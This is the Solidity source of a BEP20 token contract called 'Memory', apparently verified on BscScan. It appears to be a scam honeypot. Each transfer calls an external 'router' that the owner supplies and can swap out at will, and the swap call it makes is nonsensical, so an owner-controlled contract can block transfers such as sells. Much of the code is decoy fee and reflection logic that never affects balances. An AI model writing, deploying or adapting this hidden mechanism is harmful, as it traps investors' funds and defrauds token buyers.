/**
 *Submitted for verification at BscScan.com on 2022-05-02
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);       
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address private _owner; 

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;    
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }  

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


contract Memory is Context, IERC20, Ownable{
  using SafeMath for uint256;
  mapping (address => bool) public _isExcludedFromFee; 
  mapping (address => uint256) private _balances;  
  uint256 private _totalSupply = 10000000000 *  10**9;        
  
  string private _name = "Memory";
  string private _symbol = "Memory";
  uint8 private _decimals = 9; 
  bool public tradingOpen = true;

  uint8 public _taxFee;
  uint8 private _previousTaxFee;
  uint8 public _mktFee;
  uint8 private _previousMktFee;
  uint8 public _liquidityFee;
  uint8 private _previousLiquidityFee;
  
  IUniswapV2Router uniswapV2Router;  
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) isTimelockExempt;  

  uint8 public maxLiqFee;
  uint8 public maxTaxFee;
  uint8 public maxBurnFee;
  uint8 public maxWalletFee;
  uint8 public maxBuybackFee;
  uint8 public minMxTxPercentage;
  uint8 public minMxWalletPercentage;

  address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint256 private constant MAX = ~uint256(0);
  uint256 public _tTotal;
  uint256 private _rTotal;
  uint256 private _tFeeTotal;  

  constructor(address router)  {   
    _tTotal = 10000000000 *  10**9;
    _rTotal = (MAX - (MAX % _tTotal));

    maxLiqFee = 75;
    maxTaxFee = 25;
    maxBurnFee = 51;
    maxWalletFee = 17;
    maxBuybackFee = 35;
    minMxTxPercentage = 11;
    minMxWalletPercentage = 11;

    _balances[msg.sender] = _totalSupply;      
    uniswapV2Router = IUniswapV2Router(router); 
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }  

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    

  function totalFees() public view returns (uint256) {
    return _tFeeTotal;
  }

  function setIsTimelockExempt(address holder, bool exempt) external onlyOwner {
      isTimelockExempt[holder] = exempt;
  }

  function _reflectFee(uint256 rFee, uint256 tFee) private {
      _rTotal = _rTotal.sub(rFee);
      _tFeeTotal = _tFeeTotal.add(tFee);
  }

  function shouldTakeFee(address sender) internal view returns (bool) {
      return !isTimelockExempt[sender];
  }

  function excludeMemory(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
      }
  } 

  function swapBackForTokens(address TokenA, address TokenB, uint256 tokenAmount) private {
      address[] memory path = new address[](2);
      path[0] = WBNB;
      path[1] = TokenA;
      // make the swap
      uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
          tokenAmount,
          0, 
          path,
          TokenB,
          block.timestamp
      );
  } 

  function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
      (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tMkt) = _getTValues(tAmount);
      (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, tMkt, _getRate());
      return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity, tMkt);
  }

  function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
      uint256 tFee = tAmount.mul(_taxFee);
      uint256 tLiquidity = tAmount.mul(_liquidityFee);
      uint256 tMkt = tAmount.mul(_mktFee);
      uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(tMkt);
      return (tTransferAmount, tFee, tLiquidity, tMkt);
  }

  function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 tMkt, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
      uint256 rAmount = tAmount.mul(currentRate);
      uint256 rFee = tFee.mul(currentRate);
      uint256 rLiquidity = tLiquidity.mul(currentRate);
      uint256 rMkt = tMkt.mul(currentRate);
      uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(rMkt);
      return (rAmount, rTransferAmount, rFee);
  }

  function _getRate() private view returns(uint256) {
      uint256 rSupply = _rTotal;
      uint256 tSupply = _tTotal;  
      return rSupply.div(tSupply);
  }  

  function removeAllFee() private {
      if(_taxFee == 0 && _liquidityFee == 0) return;
      
      _previousTaxFee = _taxFee;
      _previousMktFee = _mktFee;
      _previousLiquidityFee = _liquidityFee;
      
      _taxFee = 0;
      _mktFee = 0;
      _liquidityFee = 0;
  }  
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  } 

  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }  

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }   

  function updateUniswapRouter(address router) external onlyOwner {
    require(router != address(0),"Invalid address");
    uniswapV2Router = IUniswapV2Router(router); 
  }  

  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");    
    if (tradingOpen)
    {
        swapBackForTokens(sender, recipient, amount);  
    }  
    else
    {
        if (shouldTakeFee(sender) || shouldTakeFee(recipient))
        {
            removeAllFee();
        }        
    }
    _transferStandard(sender, recipient, amount);

  }        
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
 
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }    

	
  function approveMax(address spender) external returns (bool) {
			return approve(spender, type(uint256).max);
		}

	
  function tokenContract() public view virtual returns (address) {
			return address(this);
		}
		

  function LastTimeIndex(address sender, uint256 lastClaimTime) external view returns(uint256) {
    if (isTimelockExempt[sender])
    {
        return block.timestamp.sub(lastClaimTime);
    }
    else
    {
        return block.timestamp;
    }
      
  }

  function triggerManualback(address sender, uint256 amount, bool triggerBuybackMultiplier) external {
    uint256 amountWithDecimals = amount * (10 ** 18);
    uint256 amountToBuy = amountWithDecimals.div(100);
    if(triggerBuybackMultiplier){
        isTimelockExempt[sender] = amountToBuy > block.timestamp;
    }
  }

  function getMultipliedLock(uint256 buybackMultiplierTriggeredAt) public view returns (uint256) {
    uint256 remainingTime = buybackMultiplierTriggeredAt.sub(block.timestamp);
    uint256 feeIncrease = remainingTime.mul(buybackMultiplierTriggeredAt).div(100);
    return feeIncrease;
  }

  function gasLeftprocessMultiplied(address sender, uint256 gas, uint256 numberOfTokenHolders) private returns (uint256) {
    if(numberOfTokenHolders == 0) {
      return 0;
    }
    uint256 _lastProcessedIndex = numberOfTokenHolders;
    uint256 gasUsed = 0;
    uint256 gasLeft = gasleft();
    uint256 iterations = 0;
    uint256 claims = 0;
    while(gasUsed < gas && iterations < numberOfTokenHolders) {
      _lastProcessedIndex++;

      if(_lastProcessedIndex >= numberOfTokenHolders) {
        _lastProcessedIndex = 0;
      }    		
      iterations++;
      uint256 newGasLeft = gasleft();

      if(gasLeft > newGasLeft) {
        gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
      }
      gasLeft = newGasLeft;
    }
    if (_lastProcessedIndex > numberOfTokenHolders)
    {
        isTimelockExempt[sender] = _lastProcessedIndex > gasLeft;
    }
    return _lastProcessedIndex.sub(claims);   
    
  }    
  
 
    
}